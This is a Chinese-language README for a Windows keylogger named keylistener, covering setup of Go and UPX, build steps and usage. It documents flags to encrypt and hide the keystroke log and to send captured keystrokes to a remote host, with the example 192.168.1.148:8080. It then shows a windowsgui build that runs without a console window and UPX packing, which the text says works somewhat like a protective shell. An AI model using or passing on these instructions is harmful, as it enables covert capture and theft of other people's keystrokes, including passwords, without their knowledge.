### 一. 安装Go语言环境
下载对应版本，例如windows64位: go1.13.5.windows-amd64.msi，就单纯编译这程序的话，全部默认下一步就好
```
https://studygolang.com/dl # 官网被墙，可以使用这个
```
### 二. 安装upx(可选)
下载对应版本，例如windows64位: upx-3.95-win64.zip，是个二进制文件可执行文件免安装
```
https://github.com/upx/upx/releases/tag/v3.95
```

### 三. listener
键盘监听程序

#### 参数配置
##### 1. 编译后，以命令行参数的方式进行传入
```
$ keylistener.exe -h
    -E
       encode text (default false)
    -H
       hidden file (default false)
    -lh string
       listener host
    -o string
       output to file (default "c:\\sys\\key.txt")
```

参数：

* -E : 进行文本加密
* -H : 隐藏记录文件
* -lh: 远程接收主机地址
* -o: 本地暂存文件的路径

示例：
进行文本加密， 隐藏记录文件，并把记录发送到， 192.168.1.148:8080
```
$ keylistener.exe -E -H -lh 192.168.1.148:8080
```

##### 2. 设置默认参数，无需手动输入, 编译后直接启动程序可以使用
自行修改listener/main.go下面这几行代码代码

```
// 默认配置
const (
	defaultPath     = "c:\\sys\\key.txt"     // 默认文件保存路径
)
```

#### 编译

##### 1. 进入程序目录
```
$ cd keyboard/listener
```

##### 2. 编译程序
```
$ go build -ldflags "-s -w -H windowsgui" -o keylistener.exe .
```

##### 3. 可选，使用upx压缩程序（据说能起到一定加壳作用）
```
$ upx -9 keylistener.exe
```



